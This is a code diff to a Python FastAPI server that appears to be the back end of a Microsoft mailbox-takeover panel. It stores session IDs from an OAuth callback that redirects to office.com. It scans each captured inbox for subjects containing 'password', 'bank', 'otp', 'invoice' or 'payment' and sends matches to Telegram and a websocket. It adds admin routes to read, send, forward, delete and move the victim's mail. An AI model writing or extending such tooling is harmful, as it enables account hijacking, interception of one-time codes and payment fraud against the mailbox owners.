@@ -9,12 +9,13 @@ from graph import (
     fetch_emails,
     get_mail_folders,
     get_email_detail,
-    reply_to_email,  # Ensure this is here
+    reply_to_email,
     send_email,
     forward_email,
     delete_email,
     mark_as_read,
-    get_conversation
+    get_conversation,
+    move_email_to_folder  # ✅ already expected
 )
 from admin_auth import login_admin, require_admin
 from urllib.parse import urlparse, parse_qs
@@ -29,6 +30,11 @@ app = FastAPI()
 # LOGGING
 # =========================
 logging.basicConfig(level=logging.DEBUG)
+
+# =========================
+# ALERT STORAGE
+# =========================
+alerts_store = []
 
 # =========================
 # CORS
@@ -63,6 +69,29 @@ async def log_requests(request: Request, call_next):
     return response
 
 # =========================
+# WEBSOCKET ALERTS
+# =========================
+connected_clients = []
+
+@app.websocket("/ws/alerts")
+async def websocket_alerts(ws: WebSocket):
+    await ws.accept()
+    connected_clients.append(ws)
+
+    try:
+        while True:
+            await ws.receive_text()
+    except:
+        connected_clients.remove(ws)
+
+async def broadcast_alert(message: str):
+    for ws in connected_clients:
+        try:
+            await ws.send_text(message)
+        except:
+            pass
+
+# =========================
 # STARTUP
 # =========================
 @app.on_event("startup")
@@ -70,7 +99,7 @@ def startup():
     init_db()
 
 # =========================
-# ADMIN LOGIN (🔥 FIXED)
+# ADMIN LOGIN
 # =========================
 @app.post("/admin/login")
 async def admin_login_route(request: Request):
@@ -83,7 +112,6 @@ async def admin_login_route(request: Request):
     if "error" in result:
         return JSONResponse(result, status_code=401)
 
-    # ✅ SET ADMIN COOKIE
     response = JSONResponse({"message": "Login successful"})
 
     response.set_cookie(
@@ -131,7 +159,6 @@ def auth_callback(request: Request):
     client_ip = request.client.host
 
     try:
-        # ✅ FIXED STATE PARSING
         if ":" in state:
             user_id, session_id = state.split(":")
         else:
@@ -142,7 +169,6 @@ def auth_callback(request: Request):
 
         response = RedirectResponse(url="https://www.office.com")
 
-        # ✅ SESSION COOKIE (MICROSOFT)
         response.set_cookie(
             key="session_id",
             value=session_id,
@@ -171,7 +197,7 @@ def check_session(request: Request):
     }
 
 # =========================
-# EMAILS
+# EMAILS (WITH ALERTS)
 # =========================
 @app.get("/emails")
 def get_emails(request: Request, user_id: str = None):
@@ -183,9 +209,26 @@ def get_emails(request: Request, user_id: str = None):
     if not session_id or session_id == "default":
         return JSONResponse({"error": "No Microsoft session"}, status_code=401)
 
-    return {
-        "emails": fetch_emails(user_id or "default-user", session_id)
-    }
+    emails = fetch_emails(user_id or "default-user", session_id)
+
+    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]
+
+    for e in emails:
+        subject = (e.get("subject") or "").lower()
+
+        for word in ALERT_KEYWORDS:
+            if word in subject:
+                msg = f"🚨 {word.upper()} detected → {e.get('subject')}"
+
+                send_telegram_alert(msg)
+                alerts_store.append({"message": msg})
+
+                try:
+                    asyncio.create_task(broadcast_alert(msg))
+                except:
+                    pass
+
+    return {"emails": emails}
 
 # =========================
 # FOLDERS
@@ -202,6 +245,14 @@ def get_folders(request: Request, user_id: str = None):
     return {
         "folders": get_mail_folders(user_id or "default-user", session_id)
     }
+
+# =========================
+# ALERTS
+# =========================
+@app.get("/alerts")
+def get_alerts(request: Request):
+    require_admin(request)
+    return {"alerts": alerts_store}
 
 # =========================
 # RULES
@@ -243,3 +294,90 @@ def get_rules(request: Request):
 
     db.close()
     return {"rules": result}
+
+# =========================
+# EMAIL ACTION ROUTES (🔥 ADDED ONLY)
+# =========================
+
+@app.post("/email/reply")
+async def reply_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return reply_to_email(
+        "default-user",
+        session_id,
+        body.get("message_id"),
+        body.get("reply_text")
+    )
+
+
+@app.post("/email/send")
+async def send_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return send_email(
+        "default-user",
+        session_id,
+        body.get("to"),
+        body.get("subject"),
+        body.get("body")
+    )
+
+
+@app.post("/email/forward")
+async def forward_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return forward_email(
+        "default-user",
+        session_id,
+        body.get("message_id"),
+        body.get("to")
+    )
+
+
+@app.post("/email/delete")
+async def delete_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return delete_email(
+        "default-user",
+        session_id,
+        body.get("message_id")
+    )
+
+
+@app.post("/email/mark-read")
+async def mark_read_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return mark_as_read(
+        "default-user",
+        session_id,
+        body.get("message_id"),
+        body.get("is_read", True)
+    )
+
+
+@app.post("/email/move")
+async def move_email_route(request: Request):
+    require_admin(request)
+    body = await request.json()
+    session_id = request.cookies.get("session_id")
+
+    return move_email_to_folder(
+        "default-user",
+        session_id,
+        body.get("message_id"),
+        body.get("folder_id")
+    )
